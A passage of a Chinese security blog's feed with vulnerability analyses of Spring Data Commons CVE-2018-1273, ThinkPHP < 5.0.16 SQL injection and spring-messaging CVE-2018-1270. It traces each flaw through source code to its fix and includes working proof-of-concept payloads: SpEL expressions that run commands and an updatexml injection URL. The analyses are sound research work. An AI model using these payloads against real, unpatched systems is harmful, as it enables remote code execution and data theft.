-<p>另外matthiaskaiser 在 <a href="https://gist.github.com/matthiaskaiser/bfb274222c009b3570ab26436dc8799e" target="_blank" rel="external">https://gist.github.com/matthiaskaiser/bfb274222c009b3570ab26436dc8799e</a> 给出了另一个payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username[#this.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;js&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(&apos;xterm&apos;)&quot;)]=asdf</div></pre></td></tr></table></figure></p>
-<p>关于这个payload是怎么出来的，可以借鉴以下几个漏洞</p>
-<ol>
-<li><a href="http://drops.xmd5.com/static/drops/papers-5107.html" target="_blank" rel="external">ElasticSearch Groovy脚本远程代码执行漏洞分析（CVE-2015-1427）</a><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180412205148-4334be60-3e50-1.png" alt="13.jpg"></li>
-<li><a href="https://jaq.alibaba.com/blog.htm?id=48" target="_blank" rel="external">WebView 远程代码执行漏洞浅析</a><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180412205148-437762b0-3e50-1.png" alt="12.jpg"></li>
-</ol>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2269&quot;&gt;Spring Data Commons Remote Code Execution 分析-【CVE-2018-1273】&lt;/a&gt;&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
-    
-    
-      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
-    
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-      <category term="spring" scheme="http://chybeta.github.io/tags/spring/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Thinkphp框架 &lt; 5.0.16 sql注入漏洞分析</title>
-    <link href="http://chybeta.github.io/2018/04/10/Thinkphp%E6%A1%86%E6%9E%B6-5-0-16-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    <id>http://chybeta.github.io/2018/04/10/Thinkphp框架-5-0-16-sql注入漏洞分析/</id>
-    <published>2018-04-09T23:22:49.000Z</published>
-    <updated>2018-04-09T23:23:52.524Z</updated>
-    
-    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2257" target="_blank" rel="external">Thinkphp框架 &lt; 5.0.16 sql注入漏洞分析</a><br><a id="more"></a></p>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/1.jpg?raw=true" alt=""></p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>搭建好数据库，以我自己的配置为例。数据库为tptest，表名为user，其中有两个字段id和username<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/2.jpg?raw=true" alt=""></p>
-<p>thinkphp官网下载5.0.15版本： <a href="http://www.thinkphp.cn/down/1125.html" target="_blank" rel="external">http://www.thinkphp.cn/down/1125.html</a> 。修改数据库配置信息 application/database.php。在 application/config.php 中打开调试和trace，<code>app_debug</code>和<code>app_trace</code>均为true。在 application/index/controller/Index.php 中Index类中添加方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">testsql</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    $username = input(<span class="string">'get.username/a'</span>);</div><div class="line">    db(<span class="string">'user'</span>)-&gt;where([<span class="string">'id'</span>=&gt; <span class="number">1</span>])-&gt;insert([<span class="string">'username'</span>=&gt;$username]);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/index.php/index/index/testsql?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/3.jpg?raw=true" alt=""></p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>通过input获取到参数后，<code>username</code>变量情况如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/4.jpg?raw=true" alt=""></p>
-<p>跟入insert，thinkphp/library/think/db/Query.php:2078<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">(array $data = [], $replace = false, $getLastInsID = false, $sequence = null)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="comment">// 分析查询表达式</span></div><div class="line">    $options = <span class="keyword">$this</span>-&gt;parseExpress();</div><div class="line">    $data    = array_merge($options[<span class="string">'data'</span>], $data);</div><div class="line">    ...</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/5.jpg?raw=true" alt=""></p>
-<p>接下去执行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$sql = <span class="keyword">$this</span>-&gt;builder-&gt;insert($data, $options, $replace);</div></pre></td></tr></table></figure></p>
-<p>跟入 thinkphp/library/think/db/Builder.php:720：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">(array $data, $options = [], $replace = false)</span></span></div><div class="line">  &#123;</div><div class="line">      <span class="comment">// 分析并处理数据</span></div><div class="line">      $data = <span class="keyword">$this</span>-&gt;parseData($data, $options);</div><div class="line">      <span class="keyword">if</span> (<span class="keyword">empty</span>($data)) &#123;</div><div class="line">          <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">      &#125;</div><div class="line">      ...</div></pre></td></tr></table></figure></p>
-<p>跟入<code>parseData</code>至 thinkphp/library/think/db/Builder.php:101 ，相关变量信息已经注释添加。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseData</span><span class="params">($data, $options)</span></span></div><div class="line">&#123;</div><div class="line">    ...</div><div class="line">    <span class="comment">// 注</span></div><div class="line">    <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $val) &#123; <span class="comment">// 第 101 行左右</span></div><div class="line">    <span class="comment">//  $key : "username"</span></div><div class="line">    <span class="comment">//  $val : &#123;"inc","updatexml(1,concat(0x7,user(),0x7e),1)","1"&#125;</span></div><div class="line">        $item = <span class="keyword">$this</span>-&gt;parseKey($key, $options);</div><div class="line">        <span class="keyword">if</span> (is_object($val) &amp;&amp; method_exists($val, <span class="string">'__toString'</span>)) &#123;</div><div class="line">            ....</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">false</span> === strpos($key, <span class="string">'.'</span>) &amp;&amp; !in_array($key, $fields, <span class="keyword">true</span>)) &#123;</div><div class="line">            ...</div><div class="line">        &#125; <span class="keyword">elseif</span> (is_null($val)) &#123;</div><div class="line">            ...</div><div class="line">        &#125; <span class="keyword">elseif</span> (is_array($val) &amp;&amp; !<span class="keyword">empty</span>($val)) &#123;</div><div class="line">            <span class="comment">// $val[0] = "inc"</span></div><div class="line">            <span class="keyword">switch</span> ($val[<span class="number">0</span>]) &#123;</div><div class="line">                <span class="keyword">case</span> <span class="string">'exp'</span>:</div><div class="line">                    $result[$item] = $val[<span class="number">1</span>];</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> <span class="string">'inc'</span>:</div><div class="line">                    $result[$item] = <span class="keyword">$this</span>-&gt;parseKey($val[<span class="number">1</span>]) . <span class="string">'+'</span> . floatval($val[<span class="number">2</span>]);</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> <span class="string">'dec'</span>:</div><div class="line">                    $result[$item] = <span class="keyword">$this</span>-&gt;parseKey($val[<span class="number">1</span>]) . <span class="string">'-'</span> . floatval($val[<span class="number">2</span>]);</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">     ...</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $result;</div></pre></td></tr></table></figure>
-<p>可以看出<code>$val</code>是数组，且根据<code>$val[0]</code>值为<code>inc</code>，会通过switch语句进入到下面这条：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> <span class="string">'inc'</span>:</div><div class="line">    <span class="comment">// $val[1] = "updatexml(1,concat(0x7,user(),0x7e),1)"</span></div><div class="line">    <span class="comment">// $val[2] = "1"</span></div><div class="line">    $result[$item] = <span class="keyword">$this</span>-&gt;parseKey($val[<span class="number">1</span>]) . <span class="string">'+'</span> . floatval($val[<span class="number">2</span>]);</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure></p>
-<p>跟入此处的<code>parseKey</code>，即thinkphp/library/think/db/builder/Mysql.php:90<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseKey</span><span class="params">($key, $options = [])</span></span></div><div class="line">&#123;</div><div class="line">    $key = trim($key);</div><div class="line">    <span class="keyword">if</span> (strpos($key, <span class="string">'$.'</span>) &amp;&amp; <span class="keyword">false</span> === strpos($key, <span class="string">'('</span>)) &#123;</div><div class="line">        <span class="comment">// JSON字段支持</span></div><div class="line">        <span class="keyword">list</span>($field, $name) = explode(<span class="string">'$.'</span>, $key);</div><div class="line">        $key                = <span class="string">'json_extract('</span> . $field . <span class="string">', \'$.'</span> . $name . <span class="string">'\')'</span>;</div><div class="line">    &#125; <span class="keyword">elseif</span> (strpos($key, <span class="string">'.'</span>) &amp;&amp; !preg_match(<span class="string">'/[,\'\"\(\)`\s]/'</span>, $key)) &#123;</div><div class="line">        <span class="keyword">list</span>($table, $key) = explode(<span class="string">'.'</span>, $key, <span class="number">2</span>);</div><div class="line">        <span class="keyword">if</span> (<span class="string">'__TABLE__'</span> == $table) &#123;</div><div class="line">            $table = <span class="keyword">$this</span>-&gt;query-&gt;getTable();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($options[<span class="string">'alias'</span>][$table])) &#123;</div><div class="line">            $table = $options[<span class="string">'alias'</span>][$table];</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/[,\'\"\*\(\)`.\s]/'</span>, $key)) &#123;</div><div class="line">        $key = <span class="string">'`'</span> . $key . <span class="string">'`'</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($table)) &#123;</div><div class="line">        <span class="keyword">if</span> (strpos($table, <span class="string">'.'</span>)) &#123;</div><div class="line">            $table = str_replace(<span class="string">'.'</span>, <span class="string">'`.`'</span>, $table);</div><div class="line">        &#125;</div><div class="line">        $key = <span class="string">'`'</span> . $table . <span class="string">'`.'</span> . $key;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $key; <span class="comment">// $key : "updatexml(1,concat(0x7,user(),0x7e),1)"</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>此处并未对传入的<code>$key</code>进行更多的过滤与检查，最后返回的仍然是<code>1 and (updatexml(1,concat(0x7,user(),0x7e),1))</code></p>
-<p>回到<code>parseData</code>，<code>floatval($val[2])</code>返回1，这也正是我们要传入<code>username[2]=1</code>的原因。将其与前面经过<code>parseKey</code>的结果进行拼接后返回给<code>result</code><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/6.jpg?raw=true" alt=""></p>
-<p>回到 thinkphp/library/think/db/Query.ph 的 insert 中：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/7.jpg?raw=true" alt=""></p>
-<p>sql注入成功。</p>
-<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>官方commit： <a href="https://github.com/top-think/framework/commit/363fd4d90312f2cfa427535b7ea01a097ca8db1b" target="_blank" rel="external">https://github.com/top-think/framework/commit/363fd4d90312f2cfa427535b7ea01a097ca8db1b</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/8.jpg?raw=true" alt=""><br>在进行<code>dec</code>和<code>inc</code>操作之前对<code>$val[1]</code>的值进行了再次确认。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2257&quot;&gt;Thinkphp框架 &amp;lt; 5.0.16 sql注入漏洞分析&lt;/a&gt;&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
-    
-    
-      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
-    
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-      <category term="sql注入" scheme="http://chybeta.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
-    
-      <category term="thinkphp" scheme="http://chybeta.github.io/tags/thinkphp/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>spring-messaging Remote Code Execution 分析-【CVE-2018-1270】</title>
-    <link href="http://chybeta.github.io/2018/04/07/spring-messaging-Remote-Code-Execution-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1270%E3%80%91/"/>
-    <id>http://chybeta.github.io/2018/04/07/spring-messaging-Remote-Code-Execution-分析-【CVE-2018-1270】/</id>
-    <published>2018-04-07T04:15:46.000Z</published>
-    <updated>2018-04-11T15:36:25.168Z</updated>
-    
-    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2252" target="_blank" rel="external">spring-messaging Remote Code Execution 分析-【CVE-2018-1270】</a><br><a id="more"></a></p>
-<h1 id="漏洞公告"><a href="#漏洞公告" class="headerlink" title="漏洞公告"></a>漏洞公告</h1><p><a href="https://pivotal.io/security/cve-2018-1270" target="_blank" rel="external">https://pivotal.io/security/cve-2018-1270</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180407/1.jpg?raw=true" alt=""></p>
-<p>漏洞影响版本:</p>
-<ol>
-<li>Spring Framework 5.0 to 5.0.4</li>
-<li>Spring Framework 4.3 to 4.3.14</li>
-<li>Older unsupported versions are also affected</li>
-</ol>
-<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>利用官方示例 <a href="https://github.com/spring-guides/gs-messaging-stomp-websocket" target="_blank" rel="external">https://github.com/spring-guides/gs-messaging-stomp-websocket</a> ，git clone后checkout到未更新版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/spring-guides/gs-messaging-stomp-websocket</div><div class="line"></div><div class="line">git checkout 6958af0b02bf05282673826b73cd7a85e84c12d3</div></pre></td></tr></table></figure></p>
-<p>用IDEA打开gs-messaging-stomp-websocket目录下的complete项目，修改app.js中的第15行：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> header  = &#123;<span class="string">"selector"</span>:<span class="string">"T(java.lang.Runtime).getRuntime().exec('calc.exe')"</span>&#125;;</div><div class="line">    <span class="keyword">var</span> socket = <span class="keyword">new</span> SockJS(<span class="string">'/gs-guide-websocket'</span>);</div><div class="line">    stompClient = Stomp.over(socket);</div><div class="line">    stompClient.connect(&#123;&#125;, <span class="function"><span class="keyword">function</span> (<span class="params">frame</span>) </span>&#123;</div><div class="line">        setConnected(<span class="literal">true</span>);</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'Connected: '</span> + frame);</div><div class="line">        stompClient.subscribe(<span class="string">'/topic/greetings'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">greeting</span>) </span>&#123;</div><div class="line">            showGreeting(<span class="built_in">JSON</span>.parse(greeting.body).content);</div><div class="line">        &#125;,header);</div><div class="line">    &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>增加了一个header头部，其中指定了<code>selector</code>，其值即payload。</p>
-<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>点击connect后建立起连接，在文本框中随意输入，点击Send，触发poc：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180407/2.gif?raw=true" alt=""></p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>当在 <a href="http://localhost:8080/" target="_blank" rel="external">http://localhost:8080/</a> 中点击Connect后，在app.js中，有如下代码，会建立起Websocket连接：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> header  = &#123;<span class="string">"selector"</span>:<span class="string">"T(java.lang.Runtime).getRuntime().exec('calc.exe')"</span>&#125;;</div><div class="line">...</div><div class="line">stompClient.subscribe(<span class="string">'/topic/greetings'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">greeting</span>) </span>&#123;</div><div class="line">    showGreeting(<span class="built_in">JSON</span>.parse(greeting.body).content);</div><div class="line">&#125;,header);</div></pre></td></tr></table></figure></p>
-<p>其中<code>header</code>中指定了<code>selector</code>，根据 <a href="https://stomp.github.io/stomp-specification-1.0.html" target="_blank" rel="external">Stomp Protocol Specification, Version 1.0</a>，通过指定对应的selecttor，可以对订阅的信息进行过滤：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Stomp brokers may support the selector header which allows you to specify an SQL 92 selector on the message headers which acts as a filter for content based routing.</div><div class="line"></div><div class="line">You can also specify an id header which can then later on be used to UNSUBSCRIBE from the specific subscription as you may end up with overlapping subscriptions using selectors with the same destination. If an id header is supplied then Stomp brokers should append a subscription header to any MESSAGE commands which are sent to the client so that the client knows which subscription the message relates to. If using Wildcards and selectors this can help clients figure out what subscription caused the message to be created.</div></pre></td></tr></table></figure></p>
-<p>在 org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java 第140行，对这个header参数进行了接受和处理：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">addSubscriptionInternal</span><span class="params">(</span></span></div><div class="line">        String sessionId, String subsId, String destination, Message&lt;?&gt; message) &#123;</div><div class="line"></div><div class="line">    Expression expression = <span class="keyword">null</span>;</div><div class="line">    MessageHeaders headers = message.getHeaders();</div><div class="line">    String selector = SimpMessageHeaderAccessor.getFirstNativeHeader(getSelectorHeaderName(), headers);</div><div class="line">    <span class="keyword">if</span> (selector != <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            expression = <span class="keyword">this</span>.expressionParser.parseExpression(selector);</div><div class="line">            <span class="keyword">this</span>.selectorHeaderInUse = <span class="keyword">true</span>;</div><div class="line">            <span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</div><div class="line">                logger.trace(<span class="string">"Subscription selector: ["</span> + selector + <span class="string">"]"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">catch</span> (Throwable ex) &#123;</div><div class="line">            <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</div><div class="line">                logger.debug(<span class="string">"Failed to parse selector: "</span> + selector, ex);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">this</span>.subscriptionRegistry.addSubscription(sessionId, subsId, destination, expression);</div><div class="line">    <span class="keyword">this</span>.destinationCache.updateAfterNewSubscription(destination, sessionId, subsId);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180407/3.jpg?raw=true" alt=""></p>
-<p>如图所示，此次连接对应的sessionId为<code>mrzfa005</code>，subsId为<code>sub-0</code>。</p>
-<p>之后，在 <a href="http://localhost:8080/" target="_blank" rel="external">http://localhost:8080/</a> 中输入任意字符串，点击send。spring进行了一系列处理后，开始向消息的订阅者分发消息，在 org/springframework/messaging/simp/broker/SimpleBrokerMessageHandler.java:349 行：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendMessageToSubscribers</span><span class="params">(@Nullable String destination, Message&lt;?&gt; message)</span> </span>&#123;</div><div class="line">    MultiValueMap&lt;String,String&gt; subscriptions = <span class="keyword">this</span>.subscriptionRegistry.findSubscriptions(message);</div><div class="line">    ...</div></pre></td></tr></table></figure></p>
-<p>其中message保存了此次连接/会话的相关信息：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180407/5.jpg?raw=true" alt=""></p>
-<p>跟入 <code>this.subscriptionRegistry.findSubscriptions</code> 至 org/springframework/messaging/simp/broker/AbstractSubscriptionRegistry.java:111 行：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> MultiValueMap&lt;String, String&gt; <span class="title">findSubscriptions</span><span class="params">(Message&lt;?&gt; message)</span> </span>&#123;</div><div class="line">    ....</div><div class="line">    <span class="keyword">return</span> findSubscriptionsInternal(destination, message);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>message作为参数被传入 <code>findSubscriptionsInternal</code> ，在return处继续跟进至 org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java:184行<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> MultiValueMap&lt;String, String&gt; <span class="title">findSubscriptionsInternal</span><span class="params">(String destination, Message&lt;?&gt; message)</span> </span>&#123;</div><div class="line">    MultiValueMap&lt;String, String&gt; result = <span class="keyword">this</span>.destinationCache.getSubscriptions(destination, message);</div><div class="line">    <span class="keyword">return</span> filterSubscriptions(result, message);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>其中result变量值如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180407/6.jpg?raw=true" alt=""></p>
-<p>该变量即 org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java:201行的filterSubscriptions方法的<code>allMatches</code>变量，跟进至两层for循环<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (String sessionId : allMatches.keySet()) &#123;</div><div class="line">    <span class="keyword">for</span> (String subId : allMatches.get(sessionId)) &#123;</div><div class="line">        SessionSubscriptionInfo info = <span class="keyword">this</span>.subscriptionRegistry.getSubscriptions(sessionId);</div><div class="line">        <span class="keyword">if</span> (info == <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        Subscription sub = info.getSubscription(subId);</div><div class="line">        <span class="keyword">if</span> (sub == <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        ...</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>通过两次<code>getSubscriptions</code>操作，此时取出了先前的配置信息，sub变量值如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180407/7.jpg?raw=true" alt=""></p>
-<p>接下去第 207 行将selector表达式取出：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Expression expression = sub.getSelectorExpression();</div></pre></td></tr></table></figure></p>
-<p>第217行：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">    <span class="keyword">if</span> (Boolean.TRUE.equals(expression.getValue(context, Boolean.class))) &#123;</div><div class="line">        result.add(sessionId, subId);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>通过调用了<code>expression.getValue(context, Boolean.class)</code>，触发payload，执行了spel表达式，远程命令执行成功。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180407/8.jpg?raw=true" alt=""></p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a href="https://github.com/spring-guides/gs-messaging-stomp-websocket" target="_blank" rel="external">spring-guides/gs-messaging-stomp-websocket</a></li>
-<li><a href="https://docs.spring.io/spring/docs/current/spring-framework-reference/web.html#websocket-stomp" target="_blank" rel="external">spring-framework-reference: websocket-stomp</a></li>
-<li><a href="https://blog.csdn.net/pacosonswjtu/article/details/51914567" target="_blank" rel="external">springmvc(18)使用WebSocket 和 STOMP 实现消息功能</a></li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2252&quot;&gt;spring-messaging Remote Code Execution 分析-【CVE-2018-1270】&lt;/a&gt;&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
-    
-    
-      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
-    
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-      <category term="spring" scheme="http://chybeta.github.io/tags/spring/"/>
     
   </entry>
   
